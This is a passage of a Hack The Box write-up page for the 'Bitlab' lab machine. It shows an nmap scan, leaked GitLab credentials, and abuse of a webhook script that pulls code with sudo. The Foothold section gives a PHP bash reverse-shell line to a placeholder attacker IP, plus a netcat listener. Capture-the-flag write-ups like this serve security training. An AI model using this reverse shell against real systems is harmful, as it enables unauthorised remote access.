@@ -1,0 +1,614 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Develop a hunger to accomplish your dreams!">
+    <meta name="author" content="Sabe Barker">
+
+    <title>Bitlab - Hack The Box · Sabe Barker</title>
+
+    <link rel="canonical" href="https://sabebarker.com/writeups/hackthebox/machines/bitlab/">
+
+    <!-- Bootstrap core CSS -->
+    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+	<!-- Custom CSS -->
+    <link href="/assets/css/sabe.css" rel="stylesheet">
+    <!-- Lightbox -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/ekko-lightbox/5.3.0/ekko-lightbox.css" rel="stylesheet">
+    <!-- Favicons -->
+	<link rel="apple-touch-icon" href="/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
+	<link rel="icon" href="/assets/img/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+	<link rel="icon" href="/assets/img/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+	<link rel="manifest" href="/assets/img/favicons/manifest.json">
+	<link rel="mask-icon" href="/assets/img/favicons/safari-pinned-tab.svg" color="#8248f6">
+	<link rel="icon" href="/assets/img/favicons/favicon.ico">
+	<meta name="apple-mobile-web-app-title" content="Sabe Barker">
+	<meta name="application-name" content="Sabe Barker">
+	<meta name="msapplication-TileColor" content="#fff">
+	<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
+	<meta name="theme-color" content="#fff">
+	
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@sabebarker">
+    <meta name="twitter:creator" content="@sabebarker">
+    <meta name="twitter:title" content="Bitlab - Hack The Box · Sabe Barker">
+    <meta name="twitter:description" content="Develop a hunger to accomplish your dreams!">
+    <meta name="twitter:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/bitlab/bitlab_infocard.png">
+
+    <!-- Facebook -->
+    <meta property="og:url" content="https://sabebarker.com/writeups/hackthebox/machines/bitlab/" />
+    <meta property="og:title" content="Bitlab - Hack The Box · Sabe Barker">
+    <meta property="og:description" content="Develop a hunger to accomplish your dreams!">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/bitlab/bitlab_infocard.png">
+    <meta property="og:image:secure_url" content="https://sabebarker.com/assets/img/writeups/hackthebox/machines/bitlab/bitlab_infocard.png">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151243373-1"></script>
+	<script>
+  		window.dataLayer = window.dataLayer || [];
+  		function gtag(){dataLayer.push(arguments);}
+  		gtag('js', new Date());
+
+  		gtag('config', 'UA-151243373-1');
+	</script>
+  </head>
+  <body>
+    <a class="skippy sr-only sr-only-focusable" href="#content">
+      <span class="skippy-text">Skip to main content</span>
+    </a>
+
+    <header class="navbar navbar-expand navbar-light flex-column flex-md-row sb-navbar">
+      <a class="navbar-brand mr-0 mr-md-2" href="/" aria-label="Sabe Barker"><svg id="Layer_35" enable-background="new 0 0 64 64" height="36" viewbox="0 0 64 64" width="36" class="d-inline-block align-top" style="margin-right: 10px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><lineargradient id="SVGID_1_" gradientunits="userSpaceOnUse" x1="32" x2="32" y1="63" y2="1"><stop offset="0" stop-color="#9f2fff"></stop><stop offset="1" stop-color="#0bb1d3"></stop></lineargradient><path d="m42.363 39.397 1.596 1.205c-.446.59-.85 1.22-1.202 1.872l-1.761-.949c.4-.742.86-1.458 1.367-2.128zm.887-1.079 1.5 1.322c1.863-2.112 3.182-4.677 3.814-7.416l-1.949-.45c-.557 2.417-1.721 4.68-3.365 6.544zm-4.689-23.805.878-1.797c-2.33-1.139-4.833-1.716-7.439-1.716s-5.109.577-7.439 1.716l.878 1.797c4.108-2.008 9.014-2.008 13.122 0zm14.439 13.487v.396c0 5.149-1.884 10.104-5.304 13.952-1.738 1.956-2.696 4.473-2.696 7.09v.562c0 3.859-3.14 7-7 7h-12c-3.86 0-7-3.141-7-7v-.562c0-2.616-.958-5.134-2.696-7.09-3.42-3.848-5.304-8.803-5.304-13.952v-.396c0-11.58 9.42-21 21-21s21 9.42 21 21zm-2 0c0-10.477-8.523-19-19-19s-19 8.523-19 19v.396c0 4.659 1.705 9.142 4.799 12.624 2.064 2.321 3.201 5.311 3.201 8.418v.562c0 2.757 2.243 5 5 5h12c2.757 0 5-2.243 5-5v-.562c0-3.106 1.137-6.097 3.201-8.418 3.094-3.482 4.799-7.965 4.799-12.624zm-10 18v4c0 1.654-1.346 3-3 3h-12c-1.654 0-3-1.346-3-3v-4c0-1.654 1.346-3 3-3h12c1.654 0 3 1.346 3 3zm-3-1h-1v2h2v-1c0-.552-.449-1-1-1zm-9 4v2h2v-2zm2-2v-2h-2v2zm2 4h2v-2h-2zm2-4v-2h-2v2zm-10-1v1h2v-2h-1c-.551 0-1 .448-1 1zm1 5h1v-2h-2v1c0 .552.449 1 1 1zm13-1v-1h-2v2h1c.551 0 1-.448 1-1zm-8.618-19h3.236l2.105 4.211c.181.361.277.767.277 1.171 0 1.443-1.174 2.618-2.618 2.618h-2.764c-1.444 0-2.618-1.175-2.618-2.618 0-.404.096-.81.276-1.171zm1.236 2-1.553 3.105c-.043.085-.065.181-.065.277 0 .341.277.618.618.618h2.764c.341 0 .618-.277.618-.618 0-.096-.022-.191-.065-.276l-1.553-3.106zm14.089-16.293-1.218 1.218c2.149 1.225 3.511 3.509 3.511 6.075 0 3.86-3.14 7-7 7-3.067 0-5.987-1.962-6.943-4.667l-.21-.595 10.446-10.446zm-2.708 2.709-6.809 6.809c.862 1.616 2.821 2.775 4.81 2.775 2.757 0 5-2.243 5-5 0-1.989-1.209-3.798-3.001-4.584zm-19.999 11.584c-3.86 0-7-3.14-7-7 0-2.567 1.362-4.851 3.511-6.075l-1.218-1.218 1.414-1.414 10.446 10.446-.21.595c-.956 2.704-3.876 4.666-6.943 4.666zm0-2c1.989 0 3.948-1.159 4.811-2.775l-6.809-6.809c-1.793.786-3.002 2.595-3.002 4.584 0 2.757 2.243 5 5 5zm-14.098-17.676 1.49 1.334c5.498-6.138 13.374-9.658 21.608-9.658v-2c-8.802 0-17.221 3.763-23.098 10.324zm23.098 49.676v2c9.308 0 18.04-4.128 23.958-11.325l-1.545-1.27c-5.537 6.734-13.706 10.595-22.413 10.595zm-28.969-27.649c.032.688.088 1.383.168 2.062l1.986-.232c-.074-.634-.127-1.28-.156-1.922zm4.132 9.256c-.252-.592-.486-1.196-.693-1.799l-1.891.652c.223.646.474 1.297.745 1.932zm-1.256-3.643c-.164-.615-.309-1.247-.429-1.879l-1.965.375c.129.679.285 1.358.461 2.02zm52.186-13.928c.165.617.309 1.249.429 1.879l1.965-.375c-.129-.677-.284-1.356-.461-2.02zm2.876 5.613c-.032-.689-.088-1.383-.168-2.063l-1.986.233c.074.633.127 1.28.156 1.922zm-4.132-9.256c.252.589.485 1.194.694 1.798l1.891-.652c-.224-.65-.475-1.3-.746-1.932zm6.163 21.607c0 1.654-1.346 3-3 3-.117 0-.228-.021-.342-.035-.628 1.241-1.323 2.455-2.112 3.602l-1.647-1.135c.733-1.063 1.377-2.189 1.96-3.338-.53-.541-.859-1.279-.859-2.094 0-1.654 1.346-3 3-3s3 1.346 3 3zm-2 0c0-.552-.449-1-1-1s-1 .448-1 1 .449 1 1 1 1-.448 1-1zm-52.199-28.404c-1.014 1.35-1.904 2.795-2.668 4.299.535.542.867 1.285.867 2.105 0 1.654-1.346 3-3 3s-3-1.346-3-3 1.346-3 3-3c.112 0 .219.021.328.033.821-1.623 1.779-3.183 2.874-4.639zm-3.801 6.404c0-.551-.449-1-1-1s-1 .449-1 1 .449 1 1 1 1-.449 1-1z" fill="url(#SVGID_1_)"></path></svg>{ sabebarker }
+      </a>
+
+      <div class="navbar-nav-scroll">
+        <ul class="navbar-nav sb-navbar-nav flex-row">
+          <li class="nav-item">
+            <a class="nav-link " href="/search">
+        <svg height="15" class="octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search octicon octicon-search" viewbox="0 0 16 16" version="1.1" width="15" aria-hidden="true"><path fill-rule="evenodd" d="M15.7 13.3l-3.81-3.83A5.93 5.93 0 0013 6c0-3.31-2.69-6-6-6S1 2.69 1 6s2.69 6 6 6c1.3 0 2.48-.41 3.47-1.11l3.83 3.81c.19.2.45.3.7.3.25 0 .52-.09.7-.3a.996.996 0 000-1.41v.01zM7 10.7c-2.59 0-4.7-2.11-4.7-4.7 0-2.59 2.11-4.7 4.7-4.7 2.59 0 4.7 2.11 4.7 4.7 0 2.59-2.11 4.7-4.7 4.7z"></path></svg>
+      </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/">
+	      Home
+	     </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/blog">
+	      Blog
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link active" href="/writeups">
+	      Writeups
+	    </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link " href="/tools">
+	      Tools
+	    </a>
+          </li>
+        </ul>
+      </div>
+
+      <ul class="navbar-nav flex-row ml-md-auto d-none d-md-flex">
+        <li class="nav-item">
+          <a class="nav-link p-2" href="https://github.com/sabebarker" target="_blank" rel="noopener" aria-label="GitHub"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewbox="0 0 512 499.36" role="img" focusable="false"><title>GitHub</title>
+<path fill="currentColor" fill-rule="evenodd" d="M256 0C114.64 0 0 114.61 0 256c0 113.09 73.34 209 175.08 242.9 12.8 2.35 17.47-5.56 17.47-12.34 0-6.08-.22-22.18-.35-43.54-71.2 15.49-86.2-34.34-86.2-34.34-11.64-29.57-28.42-37.45-28.42-37.45-23.27-15.84 1.73-15.55 1.73-15.55 25.69 1.81 39.21 26.38 39.21 26.38 22.84 39.12 59.92 27.82 74.5 21.27 2.33-16.54 8.94-27.82 16.25-34.22-56.84-6.43-116.6-28.43-116.6-126.49 0-27.95 10-50.8 26.35-68.69-2.63-6.48-11.42-32.5 2.51-67.75 0 0 21.49-6.88 70.4 26.24a242.65 242.65 0 0 1 128.18 0c48.87-33.13 70.33-26.24 70.33-26.24 14 35.25 5.18 61.27 2.55 67.75 16.41 17.9 26.31 40.75 26.31 68.69 0 98.35-59.85 120-116.88 126.32 9.19 7.9 17.38 23.53 17.38 47.41 0 34.22-.31 61.83-.31 70.23 0 6.85 4.61 14.81 17.6 12.31C438.72 464.97 512 369.08 512 256.02 512 114.62 397.37 0 256 0z"></path></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://twitter.com/sabebarker" target="_blank" rel="noopener" aria-label="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewbox="0 0 512 416.32" role="img" focusable="false"><title>Twitter</title>
+<path fill="currentColor" d="M160.83 416.32c193.2 0 298.92-160.22 298.92-298.92 0-4.51 0-9-.2-13.52A214 214 0 0 0 512 49.38a212.93 212.93 0 0 1-60.44 16.6 105.7 105.7 0 0 0 46.3-58.19 209 209 0 0 1-66.79 25.37 105.09 105.09 0 0 0-181.73 71.91 116.12 116.12 0 0 0 2.66 24c-87.28-4.3-164.73-46.3-216.56-109.82A105.48 105.48 0 0 0 68 159.6a106.27 106.27 0 0 1-47.53-13.11v1.43a105.28 105.28 0 0 0 84.21 103.06 105.67 105.67 0 0 1-47.33 1.84 105.06 105.06 0 0 0 98.14 72.94A210.72 210.72 0 0 1 25 370.84a202.17 202.17 0 0 1-25-1.43 298.85 298.85 0 0 0 160.83 46.92"></path></svg></a>
+       </li>
+       <li class="nav-item">
+         <a class="nav-link p-2" href="https://facebook.com/sabebarker2600" target="_blank" rel="noopener" aria-label="Facebook"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-nav-svg" viewbox="0 0 24 24" role="img" focusable="false"><title>Facebook</title>
+<path fill="currentColor" d="M210.787 234.832l68.31-22.883 22.1 65.977-68.309 22.882z"></path><path fill="currentColor" d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"></path></svg></a>
+       </li>
+      </ul>
+    </header>
+
+
+    <div class="container-fluid">
+      <div class="row flex-xl-nowrap">
+        <div class="col-12 col-md-3 col-xl-2 sb-sidebar">
+          <button class="btn btn-link sb-search-docs-toggle d-md-none p-0 ml-3" type="button" data-toggle="collapse" data-target="#sb-docs-nav" aria-controls="sb-docs-nav" aria-expanded="false" aria-label="Toggle docs navigation"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewbox="0 0 30 30" role="img" focusable="false"><title>Menu</title>
+<path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button>
+
+<nav class="collapse sb-links" id="sb-docs-nav"><div class="sb-toc-item">
+      <a class="sb-toc-link" href="/writeups/hackthebox/getting-started/introduction/">
+        Getting Started
+      </a>
+
+      <ul class="nav sb-sidenav">
+<li>
+            <a href="/writeups/hackthebox/getting-started/introduction/">
+              Introduction
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/getting-started/basic-setup/">
+              Basic Setup
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/getting-started/vpn-setup/">
+              VPN Setup
+            </a>
+          </li>
+</ul>
+    </div>
+<div class="sb-toc-item active">
+      <a class="sb-toc-link" href="/writeups/hackthebox/machines/nest/">
+        Machines
+      </a>
+
+      <ul class="nav sb-sidenav">
+<li>
+            <a href="/writeups/hackthebox/machines/nest/">
+              Nest
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/resolute/">
+              Resolute
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/obscurity/">
+              Obscurity
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/openadmin/">
+              OpenAdmin
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/mango/">
+              Mango
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/traverxec/">
+              Traverxec
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/forest/">
+              Forest
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/postman/">
+              Postman
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/scavenger/">
+              Scavenger
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/json/">
+              Json
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/ai/">
+              AI
+            </a>
+          </li>
+<li class="active sb-sidenav-active">
+            <a href="/writeups/hackthebox/machines/bitlab/">
+              Bitlab
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/craft/">
+              Craft
+            </a>
+          </li>
+<li>
+            <a href="/writeups/hackthebox/machines/networked/">
+              Networked
+            </a>
+          </li>
+</ul>
+    </div></nav>
+        </div>
+
+        
+          <div class="d-none d-xl-block col-xl-2 sb-toc">
+            <ul class="section-nav">
+<li class="toc-entry toc-h2">
+<a href="#enumeration">Enumeration</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#portscan">Portscan</a></li>
+<li class="toc-entry toc-h3"><a href="#domain">Domain</a></li>
+<li class="toc-entry toc-h3"><a href="#information-leak">Information Leak</a></li>
+<li class="toc-entry toc-h3"><a href="#credentials">Credentials</a></li>
+<li class="toc-entry toc-h3"><a href="#exploitable-script">Exploitable Script</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#foothold">Foothold</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#postgres">Postgres</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#root">Root</a>
+<ul>
+<li class="toc-entry toc-h3">
+<a href="#debugging">Debugging</a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#strings">Strings</a></li>
+<li class="toc-entry toc-h4"><a href="#breaking">Breaking</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-entry toc-h2">
+<a href="#alternate-root">Alternate Root</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#git-hooks">Git Hooks</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#conclusion">Conclusion</a></li>
+</ul>
+          </div>
+        
+
+        <main class="col-12 col-md-9 col-xl-8 py-md-3 pl-md-5 sb-content" role="main">
+          <h1 class="sb-title" id="content">Bitlab</h1>
+          <p class="sb-lead">Develop a hunger to accomplish your dreams!</p>
+          <p class="text-center"><img src="/assets/img/writeups/hackthebox/machines/bitlab/bitlab_infocard.png" alt="HackTheBox Bitlab Machine Info Card" class="img-fluid"></p>
+
+<p><strong>Bitlab</strong> is a medium difficulty machine running Linux. It tests your knowledge in <em>Git</em>, basic <em>privilege escalation</em> or <em>Reverse Engineering/Debugging</em> techniques. This machine can have a relatively steep learning curve if you have no experience in software RE/Debug.</p>
+
+<p>Be sure to checkout the <a href="/writeups/hackthebox/getting-started/basic-setup/">Basic Setup</a> section  before you get started.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Like always, enumeration is our first port of call. Let’s take a look at the machine and see what we are dealing with.</p>
+
+<h3 id="portscan">Portscan</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">portscan bitlab.htb
+Grabbing ports...
+Ports grabbed!
+Scanning...
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-12-19 00:00 PST
+Nmap scan report <span class="k">for </span>bitlab.htb <span class="o">(</span>10.10.10.114<span class="o">)</span>
+Host is up <span class="o">(</span>0.22s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx
+| http-robots.txt: 55 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/<span class="k">*</span>/edit /users /help 
+|_/s/ /snippets/new /snippets/<span class="k">*</span>/edit
+| http-title: Sign <span class="k">in</span> <span class="se">\x</span>C2<span class="se">\x</span>B7 GitLab
+|_Requested resource was http://bitlab.htb/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>14.68 seconds</code></pre></figure>
+
+<h3 id="domain">Domain</h3>
+
+<p>Navigating to port <code class="highlighter-rouge">80</code> by going to <code class="highlighter-rouge">http://bitlab.htb</code> we are greeted with a <a href="https://about.gitlab.com/install/">Gitlab</a> login page:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb.png" alt="Bitlab Main Screenshot" class="img-fluid"></a></p>
+
+<p>If we click the <code class="highlighter-rouge">Explore</code> link at the bottom of the page it brings us to another page that tells us that there are <code class="highlighter-rouge">No projects found</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb_Projects-Explore.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb_Projects-Explore.png" alt="Bitlab Explore Screenshot" class="img-fluid"></a></p>
+
+<h3 id="information-leak">Information Leak</h3>
+
+<p>Going through the links at the top menu <code class="highlighter-rouge">Groups</code> and <code class="highlighter-rouge">Snippets</code> also have nothing to show. However, when we click on the <code class="highlighter-rouge">Help</code> link we are presented with a directory that contains a <code class="highlighter-rouge">bookmarks.html</code> file. This file is related to exporting bookmarks from browsers so this could potentially show us some juicy data.</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb_Index-of-help.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb_Index-of-help.png" alt="Bitlab Help Index Screenshot" class="img-fluid"></a></p>
+
+<p>Taking a look we find five pages bookmarked and one looks promising called <code class="highlighter-rouge">Gitlab Login</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb_Bookmarks.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb_Bookmarks.png" alt="Bitlab Bookmarks Screenshot" class="img-fluid"></a></p>
+
+<h3 id="credentials">Credentials</h3>
+
+<p>Having a look at this link it is <code class="highlighter-rouge">javascript</code>. Let’s right-click and select <code class="highlighter-rouge">Copy link location</code> to copy the javascript code and then navigate back to the login page at <code class="highlighter-rouge">http://bitlab.htb</code>. We will open up our web console and paste the javascript then press enter. This prefills the login details and we can successfully login:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb_javascript-login-info.gif" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb_javascript-login-info.gif" alt="Bitlab Javascript Screenshot" class="img-fluid"></a></p>
+
+<p>To see what the <code class="highlighter-rouge">password</code> is we can simply <code class="highlighter-rouge">console.log()</code> the variable like so:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb_consolelog-password.gif" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb_consolelog-password.gif" alt="Bitlab console.log Screenshot" class="img-fluid"></a></p>
+
+<p>As we can see we uncover the username: <code class="highlighter-rouge">clave</code> and password: <code class="highlighter-rouge">11d...81x</code>.</p>
+
+<p>Trying the password with the username <code class="highlighter-rouge">clave</code> as well as <code class="highlighter-rouge">root</code> via <code class="highlighter-rouge">ssh</code> unsurprisingly yields no results.</p>
+
+<p>Logging in to <em>Gitlab</em> we are presented with two projects <code class="highlighter-rouge">Profile</code> and <code class="highlighter-rouge">Deployer</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb_Clave-Projects-Dashboard.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/bitlab/bitlab.htb_Clave-Projects-Dashboard.png" alt="Bitlab Clave Dashboard Screenshot" class="img-fluid"></a></p>
+
+<p>Going to the <code class="highlighter-rouge">Administrator/Profile</code> project the first thing I notice is <code class="highlighter-rouge">TODO: Connect with postgresql</code> which could be useful information later on. There is also a link to a <code class="highlighter-rouge">profile box</code> bootstrap snippet which is contained in the <code class="highlighter-rouge">index.php</code> file of the project.</p>
+
+<h3 id="exploitable-script">Exploitable Script</h3>
+
+<p>Taking a look at the <code class="highlighter-rouge">Administrator/Deployer</code> project we see a link in <code class="highlighter-rouge">README.md</code> to a <em>Gitlab</em> <a href="https://docs.gitlab.com/ee/user/project/integrations/webhooks.html">documentation</a> page regarding <code class="highlighter-rouge">webhooks</code> and a file called <code class="highlighter-rouge">index.php</code> that looks like it is using webhooks to automatically update the local repository using <code class="highlighter-rouge">git pull</code>:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="nv">$input</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"php://input"</span><span class="p">);</span>
+<span class="nv">$payload</span>  <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+
+<span class="nv">$repo</span> <span class="o">=</span> <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">project</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$event</span> <span class="o">=</span> <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">event_type</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$state</span> <span class="o">=</span> <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">object_attributes</span><span class="o">-&gt;</span><span class="na">state</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$branch</span> <span class="o">=</span> <span class="nv">$payload</span><span class="o">-&gt;</span><span class="na">object_attributes</span><span class="o">-&gt;</span><span class="na">target_branch</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$repo</span><span class="o">==</span><span class="s1">'Profile'</span> <span class="o">&amp;&amp;</span> <span class="nv">$branch</span><span class="o">==</span><span class="s1">'master'</span> <span class="o">&amp;&amp;</span> <span class="nv">$event</span><span class="o">==</span><span class="s1">'merge_request'</span> <span class="o">&amp;&amp;</span> <span class="nv">$state</span><span class="o">==</span><span class="s1">'merged'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'cd ../profile/; sudo git pull'</span><span class="p">),</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="s2">"OK</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span></code></pre></figure>
+
+<p>When an event occurs the <code class="highlighter-rouge">index.php</code> file is run which in turn executes the <code class="highlighter-rouge">shell_exec()</code> function which is used to execute the operating system commands <code class="highlighter-rouge">cd ../profile/; sudo git pull</code></p>
+
+<p>Taking note of the command traversing to the <code class="highlighter-rouge">profile</code> directory we can find this page at: <code class="highlighter-rouge">http://bitlab.htb/profile/</code></p>
+
+<p>Looks like we have found the entry point for our <code class="highlighter-rouge">foothold</code> and potentially even a leap straight to <code class="highlighter-rouge">root</code> since <code class="highlighter-rouge">sudo</code> is being used.</p>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>All we need to do is update the <code class="highlighter-rouge">Profile</code> repository, commit the changes, submit a merge request and then merge the changes. This should satisfy all conditions of the webhook event that <code class="highlighter-rouge">clave</code> has setup and our changes to the repository should be pulled into the <code class="highlighter-rouge">profile</code> directory on the system.</p>
+
+<p>To gain a shell we will simply edit <code class="highlighter-rouge">index.php</code> in the <code class="highlighter-rouge">Profile</code> repository adding the line:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/1234 0&gt;&amp;1'"</span><span class="p">);</span> <span class="cp">?&gt;</span></code></pre></figure>
+
+<p>We then go through clicking the buttons <code class="highlighter-rouge">Commit changes</code>, <code class="highlighter-rouge">Submit merge request</code> and then <code class="highlighter-rouge">Merge</code>.</p>
+
+<p>On our <code class="highlighter-rouge">attacker</code> machine we setup our listener:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-lvp</span> 1234</code></pre></figure>
+
+<p>Once setup we execute the payload by navigating to: <code class="highlighter-rouge">http://bitlab.htb/profile/index.php</code></p>
+
+<p>We should receive a shell via <code class="highlighter-rouge">netcat</code>:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">                                                       
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.10.114.
+Ncat: Connection from 10.10.10.114:48484.
+www-data@bitlab:/var/www/html/profile<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span></code></pre></figure>
+
+<p>We can <a href="http://dev.sabebarker.com/writeups/pentesting-cheatsheets/privilege-escalation/linux/#upgrade-shell">upgrade our shell</a> if we wish.</p>
+
+<h3 id="postgres">Postgres</h3>
+
+<p>First things first we should take a look at this <code class="highlighter-rouge">postgres</code> mention we found in the <code class="highlighter-rouge">Profile</code> repository readme file. Now we are logged in to <em>GitLab</em> let’s go back through the top links we went through earlier. We can see a bunch of stuff in the <code class="highlighter-rouge">Activity</code> section that we have already seen. Moving along we go to the <code class="highlighter-rouge">Snippets</code> link and find a submission called <code class="highlighter-rouge">Postgresql</code>.</p>
+
+<p>Taking a look we see the code:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"> 
